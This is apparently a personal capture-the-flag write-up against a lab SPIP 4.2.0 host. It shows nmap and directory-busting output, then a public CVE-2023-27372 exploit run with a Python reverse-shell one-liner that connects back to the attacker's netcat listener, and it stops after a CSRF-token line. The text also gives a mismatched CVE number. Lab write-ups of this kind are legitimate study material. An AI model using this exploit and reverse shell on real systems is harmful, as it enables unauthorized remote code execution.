start from nmap scan
```shell
nmap -A -T4 -p- 10.10.22.110
```
results:
```shell
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-26 11:54 GMT
Nmap scan report for 10.10.22.110
Host is up (0.12s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 aa:57:2c:8a:48:29:f0:96:5b:9e:7d:87:8c:14:10:59 (RSA)
|   256 2b:75:03:1c:f5:e0:81:06:06:46:a0:7c:fb:06:aa:e0 (ECDSA)
|_  256 8f:9d:c8:14:0c:85:86:9a:5a:49:1e:61:3d:6a:53:e4 (ED25519)
80/tcp open  http    Apache httpd 2.4.41
|_http-title: Publisher's Pulse: SPIP Insights & Tips
|_http-server-header: Apache/2.4.41 (Ubuntu)
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Network Distance: 2 hops
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 8080/tcp)
HOP RTT       ADDRESS
1   116.70 ms 10.11.0.1
2   116.91 ms 10.10.22.110

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 557.27 seconds
```
and feroxbustrescan
```shell
feroxbuster -u http://10.10.22.110 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip,conf,inc -t 200 -s 200,204,301,302,403
```
results
```shell
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://10.10.22.110
 🚀  Threads               │ 200
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ [200, 204, 301, 302, 403]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 💲  Extensions            │ [php, html, txt, bak, zip, conf, inc]
 🏁  HTTP methods          │ [GET]
 🔃  Recursion Depth       │ 4
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
403      GET        9l       28w      277c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      313c http://10.10.22.110/images => http://10.10.22.110/images/
200      GET      150l      766w     8686c http://10.10.22.110/index.html
200      GET      150l      766w     8686c http://10.10.22.110/
301      GET        9l       28w      311c http://10.10.22.110/spip => http://10.10.22.110/spip/
301      GET        9l       28w      318c http://10.10.22.110/spip/config => http://10.10.22.110/spip/config/
200      GET        1l        2w       14c http://10.10.22.110/spip/config/cles.php
200      GET        0l        0w        0c http://10.10.22.110/spip/config/chmod.php
200      GET        0l        0w        0c http://10.10.22.110/spip/config/connect.php
200      GET      185l      533w     8145c http://10.10.22.110/spip/index.php
301      GET        9l       28w      315c http://10.10.22.110/spip/tmp => http://10.10.22.110/spip/tmp/
200      GET      185l      533w     8143c http://10.10.22.110/spip/spip.php
200      GET      649l     1653w    48074c http://10.10.22.110/spip/local/cache-css/4c6c09317d97080a6643b045a76360d3.css
200      GET        0l        0w   267329c http://10.10.22.110/spip/local/cache-js/c2614fde3897115f00ca77d35df66029.js
200      GET       93l      400w     3103c http://10.10.22.110/spip/local/cache-css/layout-f-338eac41.css
200      GET       59l      166w     5731c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-9bd05060.css.last
200      GET      140l      202w     1497c http://10.10.22.110/spip/local/cache-css/reset-f-3758722b.css
200      GET       74l      259w     2100c http://10.10.22.110/spip/local/cache-css/clear-f-73f4639a.css
200      GET      212l      925w     7638c http://10.10.22.110/spip/local/cache-css/spip-f-efe1b9a6.css
200      GET      107l      232w     2093c http://10.10.22.110/spip/local/cache-css/links-f-4b140589.css
200      GET       74l      259w     2100c http://10.10.22.110/spip/local/cache-css/clear-f-782eae8e.css
200      GET      121l      289w     4431c http://10.10.22.110/spip/local/cache-css/cssdyn-css_plan_prive_css-550e9687.css.last
200      GET       74l      259w     2100c http://10.10.22.110/spip/local/cache-css/clear-urlabs-a1fc-urlabs-a1fc.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-d5c4e3b4.css
200      GET      395l      945w     8029c http://10.10.22.110/spip/local/cache-css/barre_outils-f-9f0b6575.css
200      GET      586l     1191w     8967c http://10.10.22.110/spip/local/cache-css/typo-f-9ae19677.css
200      GET      212l      925w     7638c http://10.10.22.110/spip/local/cache-css/spip-f-545b79d7.css
200      GET       59l      166w     5665c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-fc679497.css.last
200      GET       96l      238w     1662c http://10.10.22.110/spip/local/cache-css/media-f-22d2751b.css
200      GET       93l      400w     3103c http://10.10.22.110/spip/local/cache-css/layout-f-9af27366.css.last
200      GET       59l      166w     5500c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-f78035fc-f-044cff84.css
200      GET       96l      238w     1662c http://10.10.22.110/spip/local/cache-css/media-f-fabc8f1b.css
200      GET       96l      238w     1662c http://10.10.22.110/spip/local/cache-css/media-f-32e5cc48.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-eff8d434.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-709fc2da.css
200      GET      340l     1179w    10933c http://10.10.22.110/spip/local/cache-css/theme-f-a5af8be2.css
200      GET       50l      165w     1103c http://10.10.22.110/spip/local/cache-css/reset-f-785ebfe1.css
200      GET        9l       14w      186c http://10.10.22.110/spip/local/cache-css/font-f-cffcd654.css
200      GET       59l      166w     5665c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-280047a1.css.last
200      GET       59l      166w     5665c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-44774ecd.css
200      GET       74l      259w     2100c http://10.10.22.110/spip/local/cache-css/clear-f-5d26da9e.css
200      GET      101l      210w     1667c http://10.10.22.110/spip/local/cache-css/clear-f-2479f922.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-97c0891a.css
200      GET      154l      461w     4598c http://10.10.22.110/spip/local/cache-css/installation-urlabs-8aa4-urlabs-8aa4.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-d1dbb9dc.css
200      GET       39l      134w     1189c http://10.10.22.110/spip/local/cache-css/form-f-506b48fb.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-babe4d62.css
200      GET      206l      419w     4438c http://10.10.22.110/spip/local/cache-css/lity.mediabox-f-9bf1b158.css
200      GET      234l      450w     4285c http://10.10.22.110/spip/local/cache-css/dropdown-f-3f291a41.css
200      GET      170l      335w     3276c http://10.10.22.110/spip/local/cache-css/bigup-f-2232e86f.css
200      GET       39l      134w     1189c http://10.10.22.110/spip/local/cache-css/form-f-f0eb395b.css
200      GET      107l      232w     2093c http://10.10.22.110/spip/local/cache-css/links-f-bf6ab2b6.css
200      GET       50l      165w     1103c http://10.10.22.110/spip/local/cache-css/reset-f-3582c912.css
200      GET      586l     1191w     8967c http://10.10.22.110/spip/local/cache-css/typo-f-3f229b07.css.last
200      GET      395l      945w     8054c http://10.10.22.110/spip/local/cache-css/barre_outils-f-78bde648.css.last
200      GET      209l      443w     3798c http://10.10.22.110/spip/local/cache-css/lity-f-e613b01c.css
200      GET       39l      134w     1189c http://10.10.22.110/spip/local/cache-css/form-f-0d4a3031.css
200      GET       30l       64w      646c http://10.10.22.110/spip/local/cache-css/barre_outils_prive-f-4d4fd79a.css
200      GET      264l      633w     6339c http://10.10.22.110/spip/local/cache-css/login_prive-f-f32de32a.css
200      GET       59l      166w     5830c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-024b5d87-f-6e1832e5.css
200      GET      140l      202w     1497c http://10.10.22.110/spip/local/cache-css/reset-f-e8480588.css
200      GET       93l      400w     3103c http://10.10.22.110/spip/local/cache-css/layout-f-98c390a3.css
200      GET      209l      443w     3798c http://10.10.22.110/spip/local/cache-css/lity-f-e9395bdc.css
200      GET      107l      232w     2093c http://10.10.22.110/spip/local/cache-css/links-f-826dbbd6.css
200      GET      209l      443w     3798c http://10.10.22.110/spip/local/cache-css/lity-f-454eb4f9.css
200      GET       59l      166w     5830c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-74463bc6.css.last
200      GET       59l      166w     5830c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-1d52b5cd.css.last
200      GET       25l       73w     5088c http://10.10.22.110/spip/local/cache-css/minipage-urlabs-7246-urlabs-7246-minify-7459.css.last
200      GET       59l      166w     5929c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-fca1da5b-f-71c7292a.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-13337347.css
200      GET      206l      419w     4438c http://10.10.22.110/spip/local/cache-css/lity.mediabox-f-ab36fc91.css
200      GET      212l      925w     7638c http://10.10.22.110/spip/local/cache-css/spip-f-b3441574.css
200      GET      206l      419w     4438c http://10.10.22.110/spip/local/cache-css/lity.mediabox-f-3249c56a.css
200      GET      340l     1179w    10953c http://10.10.22.110/spip/local/cache-css/theme-f-1103796b.css
200      GET       96l      238w     1662c http://10.10.22.110/spip/local/cache-css/media-f-e984b8a4.css
200      GET        9l       14w      186c http://10.10.22.110/spip/local/cache-css/font-f-fd5deff0.css
200      GET      140l      202w     1497c http://10.10.22.110/spip/local/cache-css/reset-f-e96c99b6.css
200      GET      234l      450w     4285c http://10.10.22.110/spip/local/cache-css/dropdown-f-bac73766.css
200      GET       59l      166w     5632c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-c3626a6b.css.last
200      GET       93l      400w     3103c http://10.10.22.110/spip/local/cache-css/layout-f-a62e1068.css
200      GET       74l      259w     2100c http://10.10.22.110/spip/local/cache-css/clear-f-5c100495.css
200      GET      395l      945w     8039c http://10.10.22.110/spip/local/cache-css/barre_outils-f-8355206d.css
200      GET       59l      166w     5566c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-4fde4f8d-f-913de070.css
200      GET      262l      791w    28338c http://10.10.22.110/spip/local/cache-css/b20e87ec923af04b56767039a034403f.css
200      GET      586l     1191w     8967c http://10.10.22.110/spip/local/cache-css/typo-f-95117460.css
200      GET      170l      335w     3276c http://10.10.22.110/spip/local/cache-css/bigup-f-dcb702f0.css
200      GET        9l       14w      186c http://10.10.22.110/spip/local/cache-css/font-f-38a3634f.css
200      GET      395l      945w     8079c http://10.10.22.110/spip/local/cache-css/barre_outils-f-9e5eb857.css
200      GET      101l      210w     1667c http://10.10.22.110/spip/local/cache-css/clear-f-a9dcc5f6.css
200      GET       59l      166w     5731c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-9bd05060-f-5dc8ad61.css
200      GET       96l      238w     1662c http://10.10.22.110/spip/local/cache-css/media-f-cf3a7cdb.css
200      GET       40l      114w     3199c http://10.10.22.110/spip/local/cache-css/minipres-urlabs-7b4b-urlabs-7b4b-minify-4eeb.css.last
200      GET      206l      419w     4438c http://10.10.22.110/spip/local/cache-css/lity.mediabox-f-5775e1b0.css
200      GET      262l      791w    28560c http://10.10.22.110/spip/local/cache-css/a028a81d23bf654e4779fc7898578883.css
200      GET       30l       64w      646c http://10.10.22.110/spip/local/cache-css/barre_outils_prive-f-0a5e4ef0.css
200      GET      586l     1191w     8967c http://10.10.22.110/spip/local/cache-css/typo-f-df732c4b.css
200      GET      340l     1179w    10977c http://10.10.22.110/spip/local/cache-css/theme-f-5725d0bb.css
200      GET       39l      134w     1189c http://10.10.22.110/spip/local/cache-css/form-f-ef53fde9.css
200      GET       25l       38w     1297c http://10.10.22.110/spip/local/cache-css/clear-urlabs-a1fc-urlabs-a1fc-minify-a64c.css
200      GET       59l      166w     5632c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-2ba1daa0.css.last
200      GET       59l      166w     5929c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-fca1da5b.css
200      GET      340l     1179w    10945c http://10.10.22.110/spip/local/cache-css/theme-f-617bda55.css
200      GET      371l     1466w    13304c http://10.10.22.110/spip/local/cache-css/spip_admin-f-1712c28c.css
200      GET      137l      396w    15806c http://10.10.22.110/spip/local/cache-css/cssdyn-css_vignettes_css-a69c468d-f-07f197f6.css
200      GET      649l     1653w    48197c http://10.10.22.110/spip/local/cache-css/b7d2217ac8f9736f132c0a48be4f5d48.css
301      GET        9l       28w      317c http://10.10.22.110/spip/local => http://10.10.22.110/spip/local/
200      GET      262l      791w    28264c http://10.10.22.110/spip/local/cache-css/059c8a8621fea51b208502ec4dd03287.css
200      GET      107l      232w     2093c http://10.10.22.110/spip/local/cache-css/links-f-9f058775.css
200      GET       40l      114w     3199c http://10.10.22.110/spip/local/cache-css/minipres-urlabs-7b4b-urlabs-7b4b-minify-4eeb.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-3a47fb84.css
200      GET       31l       90w     3200c http://10.10.22.110/spip/local/cache-css/installation-urlabs-8aa4-urlabs-8aa4-minify-375e.css
200      GET      140l      202w     1497c http://10.10.22.110/spip/local/cache-css/reset-f-7b43398d.css
200      GET       59l      166w     5665c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-af301655-f-e7605a80.css
200      GET      395l      945w     8049c http://10.10.22.110/spip/local/cache-css/barre_outils-f-50d5d257.css
200      GET      234l      450w     4285c http://10.10.22.110/spip/local/cache-css/dropdown-f-661acc03.css
200      GET      107l      232w     2093c http://10.10.22.110/spip/local/cache-css/links-f-d436a060.css
200      GET       59l      166w     5830c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-1d52b5cd-f-04e3bf48.css
200      GET        9l       14w      186c http://10.10.22.110/spip/local/cache-css/font-f-aaf1527b.css
200      GET       30l       64w      646c http://10.10.22.110/spip/local/cache-css/barre_outils_prive-f-2710ca33.css
200      GET       96l      238w     1662c http://10.10.22.110/spip/local/cache-css/media-f-b0a5e826.css
200      GET      209l      443w     3798c http://10.10.22.110/spip/local/cache-css/lity-f-1d589fb8.css
200      GET      206l      419w     4438c http://10.10.22.110/spip/local/cache-css/lity.mediabox-f-2f78be61.css
200      GET      107l      232w     2093c http://10.10.22.110/spip/local/cache-css/links-f-19e9e15a.css
200      GET      206l      419w     4438c http://10.10.22.110/spip/local/cache-css/lity.mediabox-f-473df49c.css
200      GET      209l      443w     3798c http://10.10.22.110/spip/local/cache-css/lity-f-0ddb339b.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-f253f4b9.css
200      GET      140l      202w     1497c http://10.10.22.110/spip/local/cache-css/reset-f-22740fec.css.last
200      GET      264l      633w     6339c http://10.10.22.110/spip/local/cache-css/login_prive-f-507b135e.css
200      GET      212l      925w     7638c http://10.10.22.110/spip/local/cache-css/spip-f-2f529d9a.css
200      GET      100l      472w     4265c http://10.10.22.110/spip/local/cache-css/minipres-urlabs-7b4b-urlabs-7b4b.css
200      GET       59l      166w     5566c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-4fde4f8d.css.last
200      GET      340l     1179w    10965c http://10.10.22.110/spip/local/cache-css/theme-f-b379eb07.css
200      GET       50l      165w     1103c http://10.10.22.110/spip/local/cache-css/reset-f-6ae088c9.css
200      GET        9l       14w      186c http://10.10.22.110/spip/local/cache-css/font-f-ea5e4ce6.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-644c5c17.css
200      GET       39l      134w     1189c http://10.10.22.110/spip/local/cache-css/form-f-a7831791.css
200      GET       59l      166w     5632c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-c3626a6b.css
200      GET       59l      166w     5830c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-024b5d87.css.last
200      GET      586l     1191w     8967c http://10.10.22.110/spip/local/cache-css/typo-f-30aee748.css
200      GET       59l      166w     5632c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-2ba1daa0-f-04a8ec49.css
200      GET      212l      925w     7638c http://10.10.22.110/spip/local/cache-css/spip-f-1c941ad2.css
200      GET      140l      202w     1497c http://10.10.22.110/spip/local/cache-css/reset-f-f251959c.css
200      GET       59l      166w     5929c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-fca1da5b.css.last
200      GET       39l      134w     1189c http://10.10.22.110/spip/local/cache-css/form-f-6a965fcc.css
200      GET       50l      165w     1103c http://10.10.22.110/spip/local/cache-css/reset-urlabs-1c1a-urlabs-1c1a.css
200      GET       59l      166w     5632c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-2ba1daa0.css
200      GET       39l      134w     1189c http://10.10.22.110/spip/local/cache-css/form-f-2542498c.css
200      GET      209l      443w     3798c http://10.10.22.110/spip/local/cache-css/lity-f-c837e73a.css
200      GET        9l       14w      186c http://10.10.22.110/spip/local/cache-css/font-f-b5057eb2.css
200      GET      649l     1653w    48197c http://10.10.22.110/spip/local/cache-css/b57292aa467c0062996908509bbbc6d2.css
200      GET      649l     1653w    48279c http://10.10.22.110/spip/local/cache-css/eba7dab9abe09ccc29b2b6700708f388.css
200      GET      262l      791w    28375c http://10.10.22.110/spip/local/cache-css/4299f7c41fdacd16ea8b1edcf42f85f5.css
200      GET      649l     1653w    48197c http://10.10.22.110/spip/local/cache-css/880b1e42c4c7fbb089fe7836038b6de3.css
200      GET      649l     1653w    48197c http://10.10.22.110/spip/local/cache-css/898643f08abba1a41283d0866ec87ddc.css
200      GET      137l      396w    15806c http://10.10.22.110/spip/local/cache-css/cssdyn-css_vignettes_css-a69c468d-f-255b822e.css
200      GET      340l     1179w    10945c http://10.10.22.110/spip/local/cache-css/theme-f-4cf7592e.css.last
200      GET       96l      238w     1662c http://10.10.22.110/spip/local/cache-css/media-f-19113c47.css
200      GET      262l      791w    28264c http://10.10.22.110/spip/local/cache-css/60a7d59be9ecf133124cb629064a4445.css
200      GET       59l      166w     5665c http://10.10.22.110/spip/local/cache-css/cssdyn-css_barre_outils_icones_css-af301655.css
200      GET      264l      633w     6339c http://10.10.22.110/spip/local/cache-css/login_prive-f-f39f7e72.css
200      GET      395l      945w     8079c http://10.10.22.110/spip/local/cache-css/barre_outils-f-ad68db02.css
200      GET     2284l     8153w   265785c http://10.10.22.110/spip/local/cache-css/1fd2c3a05fbd387c859239336d3e8614.css
200      GET      649l     1653w    48156c http://10.10.22.110/spip/local/cache-css/9eb5de8c571c2acbf6fe6c4c91f59ae9.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-e3f0dc41.css
200      GET      649l     1653w    48074c http://10.10.22.110/spip/local/cache-css/41dcc5acd92767e3d9a69d78b3ac19de.css
200      GET      649l     1653w    48402c http://10.10.22.110/spip/local/cache-css/c74e28f4de5afaa5c7fb9d648b29b773.css
200      GET      649l     1653w    47992c http://10.10.22.110/spip/local/cache-css/9278dbd07376a43bfec0f5feb99790d5.css
200      GET      649l     1653w    48074c http://10.10.22.110/spip/local/cache-css/f1aaec143e6219192d7849c07b8c074e.css
200      GET      649l     1653w    48279c http://10.10.22.110/spip/local/cache-css/5f53029385dc6b4d152614d8e73e2ce8.css
200      GET      649l     1653w    48525c http://10.10.22.110/spip/local/cache-css/1c216337d3f54cbadb61ec33589becf9.css
200      GET      649l     1653w    48156c http://10.10.22.110/spip/local/cache-css/4eb5a117e0f2fd8b6989d76f2b2f4bfe.css
200      GET     2284l     8153w   267425c http://10.10.22.110/spip/local/cache-css/d1a0d8e2b482a836198ae63b8b7db5c7.css
200      GET      163l      316w     2849c http://10.10.22.110/spip/local/cache-css/lity-f-1a035343.css
200      GET      262l      791w    28560c http://10.10.22.110/spip/local/cache-css/16cc2f99320b006d0e5f64b813c0725a.css
200      GET      649l     1653w    48197c http://10.10.22.110/spip/local/cache-css/783467eff2f09af11432e5036d142656.css
200      GET      262l      791w    28264c http://10.10.22.110/spip/local/cache-css/2fc8abd9cf2986115d78bbe9097deca5.css
200      GET      137l      396w    15161c http://10.10.22.110/spip/local/cache-css/cssdyn-css_vignettes_css-ea9494f0.css
200      GET     2284l     8153w   268420c http://10.10.22.110/spip/local/cache-css/43daae237ee1630976c900a33a015c56.css
200      GET     2284l     8153w   265785c http://10.10.22.110/spip/local/cache-css/3d572233bc9a85626e840e61b4d6c99c.css
200      GET     2284l     8153w   268420c http://10.10.22.110/spip/local/cache-css/5a47ee67240d5e45d450bb62a6df7043.css
200      GET        0l        0w        0c http://10.10.22.110/spip/tmp/cache/charger_plugins_options.php
200      GET        0l        0w        0c http://10.10.22.110/spip/tmp/cache/charger_plugins_chemins.php
200      GET        0l        0w        0c http://10.10.22.110/spip/tmp/cache/charger_plugins_fonctions.php
200      GET        0l        0w        0c http://10.10.22.110/spip/tmp/cache/charger_pipelines.php
200      GET        1l        1w      352c http://10.10.22.110/spip/tmp/cache/spip_versions_list.json
200      GET        1l       23w      520c http://10.10.22.110/spip/tmp/cache/sql_desc_sqlite3_4a6982c1.txt
200      GET        1l        1w    67351c http://10.10.22.110/spip/tmp/cache/chemin.txt
200      GET      705l     1688w    22638c http://10.10.22.110/spip/local/cache-js/jsdyn-javascript_porte_plume_start_js-18037436.js.last
200      GET       48l      116w     1064c http://10.10.22.110/spip/local/cache-js/jsdyn-javascript_bigup_trads_js-d73ff12e.js
200      GET       48l      116w     1064c http://10.10.22.110/spip/local/cache-js/jsdyn-javascript_bigup_trads_js-5bc15f22.js.last
200      GET      705l     1688w    22638c http://10.10.22.110/spip/local/cache-js/jsdyn-javascript_porte_plume_start_js-1ee60e1d.js
200      GET      705l     1659w    22153c http://10.10.22.110/spip/local/cache-js/jsdyn-javascript_porte_plume_start_js-af03d716.js
200      GET      705l     1688w    22638c http://10.10.22.110/spip/local/cache-js/jsdyn-javascript_porte_plume_start_js-771dab52.js.last
200      GET      705l     1659w    22153c http://10.10.22.110/spip/local/cache-js/jsdyn-javascript_porte_plume_start_js-af03d716.js.last
200      GET      705l     1688w    22638c http://10.10.22.110/spip/local/cache-js/jsdyn-javascript_porte_plume_start_js-fcc39be9.js.last
200      GET     2324l     6677w    67143c http://10.10.22.110/spip/local/cache-js/jsdyn-formulaires_dateur_jquery_dateur_js-61f1872d.js.last
200      GET      705l     1688w    22638c http://10.10.22.110/spip/local/cache-js/jsdyn-javascript_porte_plume_start_js-9b8e94f1.js
200      GET        4l       23w      187c http://10.10.22.110/spip/local/CACHEDIR.TAG
301      GET        9l       28w      318c http://10.10.22.110/spip/ecrire => http://10.10.22.110/spip/ecrire/
200      GET    11558l    14362w   267329c http://10.10.22.110/spip/local/cache-js/2ab8770218430b2a5b2e6efd3bb9cda2.js
200      GET      586l     1191w     8967c http://10.10.22.110/spip/local/cache-css/typo-f-4825392b.css
200      GET        1l     1030w    35626c http://10.10.22.110/spip/tmp/cache/sql_desc_4a6982c1.txt
200      GET      395l      945w     8054c http://10.10.22.110/spip/local/cache-css/barre_outils-f-78bde648.css
200      GET    11558l    14362w   267329c http://10.10.22.110/spip/local/cache-js/bbc6d988274178b76c53779ce3859293.js
200      GET    11558l    14362w   267329c http://10.10.22.110/spip/local/cache-js/9b3063f78fe47b96967430fcdd66c558.js
301      GET        9l       28w      321c http://10.10.22.110/spip/tmp/cache => http://10.10.22.110/spip/tmp/cache/
200      GET        0l        0w        0c http://10.10.22.110/spip/prive/ajax_selecteur_fonctions.php
301      GET        9l       28w      317c http://10.10.22.110/spip/prive => http://10.10.22.110/spip/prive/
200      GET        0l        0w        0c http://10.10.22.110/spip/tmp/sessions/1_0742f464dd89c8c548e153262ab5c79f.php
301      GET        9l       28w      324c http://10.10.22.110/spip/tmp/sessions => http://10.10.22.110/spip/tmp/sessions/
301      GET        9l       28w      318c http://10.10.22.110/spip/vendor => http://10.10.22.110/spip/vendor/
200      GET        3l       13w       83c http://10.10.22.110/spip/tmp/remove.txt
301      GET        9l       28w      322c http://10.10.22.110/spip/ecrire/inc => http://10.10.22.110/spip/ecrire/inc/
301      GET        9l       28w      322c http://10.10.22.110/spip/ecrire/xml => http://10.10.22.110/spip/ecrire/xml/
301      GET        9l       28w      323c http://10.10.22.110/spip/ecrire/lang => http://10.10.22.110/spip/ecrire/lang/
301      GET        9l       28w      326c http://10.10.22.110/spip/ecrire/install => http://10.10.22.110/spip/ecrire/install/
301      GET        9l       28w      325c http://10.10.22.110/spip/ecrire/public => http://10.10.22.110/spip/ecrire/public/
302      GET       10l       34w      448c http://10.10.22.110/spip/ecrire/index.php => http://10.10.22.110/spip/spip.php?page=login&url=%2Fspip%2Fecrire%2Findex.php
301      GET        9l       28w      323c http://10.10.22.110/spip/ecrire/auth => http://10.10.22.110/spip/ecrire/auth/
301      GET        9l       28w      326c http://10.10.22.110/spip/ecrire/plugins => http://10.10.22.110/spip/ecrire/plugins/
301      GET        9l       28w      322c http://10.10.22.110/spip/ecrire/src => http://10.10.22.110/spip/ecrire/src/
200      GET        0l        0w        0c http://10.10.22.110/spip/ecrire/inc/log.php
200      GET        0l        0w        0c http://10.10.22.110/spip/ecrire/inc/xml.php
200      GET        0l        0w        0c http://10.10.22.110/spip/ecrire/inc/install.php
200      GET        0l        0w        0c http://10.10.22.110/spip/ecrire/inc/documents.php
200      GET        1l        1w        2c http://10.10.22.110/spip/ecrire/inc/index.php
200      GET        0l        0w        0c http://10.10.22.110/spip/ecrire/inc/auth.php
200      GET        1l        1w        2c http://10.10.22.110/spip/ecrire/lang/index.php
301      GET        9l       28w      323c http://10.10.22.110/spip/ecrire/base => http://10.10.22.110/spip/ecrire/base/
200      GET      674l     5644w    35147c http://10.10.22.110/spip/LICENSE
302      GET       10l       34w      448c http://10.10.22.110/spip/ecrire/prive.php => http://10.10.22.110/spip/spip.php?page=login&url=%2Fspip%2Fecrire%2Fprive.php
200      GET        0l        0w        0c http://10.10.22.110/spip/ecrire/plugins/installer.php
[####################] - 9m   2883904/2883904 0s      found:231     errors:291144 
[####################] - 4m    240000/240000  896/s   http://10.10.22.110/ 
[####################] - 5m    240000/240000  882/s   http://10.10.22.110/images/ 
[####################] - 3m    240000/240000  1350/s  http://10.10.22.110/spip/ 
[####################] - 2m    240000/240000  2048/s  http://10.10.22.110/spip/tmp/ 
[####################] - 7s    240000/240000  33599/s http://10.10.22.110/spip/config/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 8s    240000/240000  30880/s http://10.10.22.110/spip/local/cache-css/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s    240000/240000  33713/s http://10.10.22.110/spip/local/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 13s   240000/240000  17849/s http://10.10.22.110/spip/local/cache-js/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s    240000/240000  33698/s http://10.10.22.110/spip/local/cache-vignettes/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2s    240000/240000  149347/s http://10.10.22.110/spip/tmp/cache/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 2m    240000/240000  2233/s  http://10.10.22.110/spip/ecrire/ 
[####################] - 7s    240000/240000  33623/s http://10.10.22.110/spip/prive/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s    240000/240000  33722/s http://10.10.22.110/spip/tmp/sessions/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 7s    240000/240000  33698/s http://10.10.22.110/spip/vendor/ => Directory listing (add --scan-dir-listings to scan)
[####################] - 52s   240000/240000  4592/s  http://10.10.22.110/spip/ecrire/inc/ 
[####################] - 5m    240000/240000  762/s   http://10.10.22.110/spip/ecrire/plugins/
```
i tried to find endpoit with RCE of LFI but no one cant do it, a tried to find frameworks of site or somethin else![[Pasted image 20251026185726.png]]
one of the end point /spip check it with Wappalyzer![[Pasted image 20251026185951.png]]
nothing interesting to find to apache 2.4.41 but for SPIP 4.2.0 we have `CVE-2023-23372`
nice its RCE ![[Pasted image 20251026190427.png]]
find ready git, i Used this: https://github.com/Chocapikk/CVE-2023-27372/?source=post_page-----a256af21d7bd---------------------------------------#
download with git
```shell
git clone https://github.com/Chocapikk/CVE-2023-27372.git
```
but its doesn't working if u use without venv,  its doesnt working
start venv
```shell
python3 -m venv venv
source venv/bin/activate
pip install -r requirements.txt
```
after we are ready to use our exploit if its RCE start reverseshell to kali
```shell
nc -lvnp 9000
```
tried python payload
```shell
python3 51536.py -u http://10.10.22.110/spip/ -v -c "python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.147.65",9000));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("bash")'"
[+] Anti-CSRF token found : AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx
